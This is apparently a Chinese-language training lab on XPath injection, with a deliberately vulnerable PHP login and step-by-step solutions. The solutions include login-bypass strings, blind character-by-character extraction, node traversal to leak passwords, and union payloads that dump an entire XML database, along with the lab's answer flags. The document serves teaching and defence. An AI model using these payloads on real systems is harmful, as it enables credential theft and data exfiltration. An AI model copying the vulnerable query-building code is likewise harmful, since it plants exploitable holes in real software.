# XPath 注入

XPath 查询用于从 XML 数据库中获取数据，与 SQL 类似，它也可能存在注入漏洞。与 SQL 一样，如果攻击者能够控制查询中使用的值，就可以构造恶意请求以从数据库中窃取额外信息。但 XPath 与 SQL 有两个主要区别。首先，XPath 仅用于获取数据，因此攻击者无法插入或修改条目。其次，由于 XPath 未实现任何访问控制系统，如果你发现了注入点，应该能够恢复整个文档。本培训将重点介绍 XPath 1.0，因为它是互联网上最常见的版本。要了解有关 XPath 语法和所有可用函数的更多信息，你可以阅读 [Mozilla 指南](https://developer.mozilla.org/en-US/docs/Web/XPath)。

## 示例

想象以下用于简单管理员登录的 PHP 代码：

```php
<?php include 'db.php';
$xml = new SimpleXMLElement($db);

// Get the password from POST data
$pass = isset($_POST['pass']) ? $_POST['pass'] : "";

$query = '/user[name="admin" and password="' . $pass . '"]';
$is_admin = $xml->xpath($query);
if ($is_admin) {
    echo "Welcome admin";
}
?>
```

我们可以看到用户提供的 `$pass` 被直接注入到查询中。这种非常糟糕的做法使你的代码容易受到 XPath 注入攻击。变量替换后，实际查询如下所示：

```xpath
/user[name="admin" and password="hunter2"]
```

现在让我们看看当我们尝试注入一些恶意 XPath 时会发生什么。

-   注入恶意 XPath

    ```xpath
    /user[name="admin" and password="admin" or "a"="a"]
    ```

    当 `$pass` 设置为 `admin" or "a"="a` 时，查询的含义发生了变化，这就是一种注入。在这里，由于末尾额外的 `or true`，攻击者完全绕过了密码检查。但这并不是攻击者在此场景中能做的唯一事情，通过使用 XPath 的合并功能，可以从数据库中提取任何内容。

-   注入合并

    ```xpath
    /user[name="admin" and password="a"] | / | /a[b=""]
    ```

    这一次，查询不仅获取 `user` 节点，还将 `/`（数据库的根）合并到结果中。

### Simple Login Bypass 

尝试以管理员身份登录。

目标：查询必须返回 `true`

code

```xpath
@blind /db/users/user[username='admin' and password='§输入§']
```

输入
- 设置 true
    ```xpath
    password='' or '1'='1'
    ```

### Schema recovery 

select * from information_schema.xml

能否仅通过盲注 XPath 注入泄露完整的 XML 结构？

目标：找到以 `FLAG-` 开头的隐藏节点
格式为 `FLAG-\d+`

代码
```xpath
@echo Query: 
@echo 
@echo

@echo Result:
@blind @single /db/users/user[username='§输入§']

```

输入
- 基准查询
    ```
    /db/users/user[username='' or 0 or '']
    ```
    - 数字 0/1 获得 false/hit

-  查询结构数量
    - 根节点下直接子节点
        ```
        /db/users/user[username='' or count(/*)>=1 or '']
        ```
        - 仅为已知的 `/db`

    - `/db` 下直接子节点
        ```
        /db/users/user[username='' or count(/db/*)>=2 or '']
        ```
        - 除已知的 `users` 外，还有另一个未知节点
    
- 查询 `/db` 下标签名称
    - 查询第1个标签
        ```
        /db/users/user[username='' or name(/db/*[1])="users" or '']
        ```
        - 标签1即为已知的 `users`

    - 查询未知标签2的名称
        ```
        /db/users/user[username='' or substring(name(/db/*[2]),1,5)="FLAG-" or '']
        ```
        - 标签2即为目标元素

- 继续查询包含 flag 的标签名称
    - 查询长度
        ```
        /db/users/user[username='' or string-length(name(/db/*[2]))>11 or '']
        ```
        - 长 12
        

    - 已知 `\d+` 仅限数字，使用单字符二分法加速暴破
        ```
        /db/users/user[username='' or substring(name(/db/*[2]),6,1)>="5" or '']
        ```
        - 得到 `5468421`
        - 或者不查询长度，而是根据字符是否 `>=0` 推断是否到达末尾

- 最终得到 `FLAG-5468421`
    ```
    /db/users/user[username='' or name(/db/*[2])="FLAG-5468421" or '']
    ```


### Going up

读取部分数据

此处包含一个查询，可用于获取用户地址的任意信息。

- username = admin
- node 设置为 [city, street, number, country, postalcode] 之一

**目标**：泄露 admin 的密码

代码
```xpath
/db/users/user[username='§输入 user§']/address/§输入 node§/text()
```

输入
- 向上回溯一层
    ```
    /db/users/user[username='admin']/address/../password/text()
    ```
    - 得到
        ```
        <result>FLAG{i9l1u6ytmrjytrd02ityf}</result>
        ```

- 横向导航
    ```
    /db/users/user[username='admin']/address/preceding-sibling::password/text()
    ```
    - 也成功


### Attributes

XPath 不仅仅是文本

使用 XPath，您还可以查询属性。

在此 XML 数据库中，用户的角色存储为 `user` 节点上的属性。

尝试查找具有 `role="ADMIN"` 的用户并获取其密码。

**目标**：找到管理员并泄露其密码

code

```xpath
/db/users/user[username='§输入 user§']/address/§输入 node§/text()
```

设置代码

```js
xml += '<username>guest</username>';
```

输入
```
/db/users/user[username='guest']/address/../../user[@role="ADMIN"]/password/text()
```
- 用户名使用有效的已知名称 `guest`
- 向上回溯并查找属性

### Merging nodes

完整数据窃取

XPath 还允许合并多个节点集。利用此功能获取整个数据库。

**目标**：获取完整数据库

代码

```xpath
/db/users/user[username='§输入 user§']/address/§输入 node§/text()
```

设置代码

```js
xml += '<username>admin</username>';
```

输入
```
/db/users/user[username='admin']/address/* | / | /text()
```
- username：使用已知有效用户名 `admin`
- node：`x | / | `
    - 前缀选择任意内容构成有效语法
    - 核心使用 `|` 合并根节点
    - 后缀选择任意路径构成有效语法
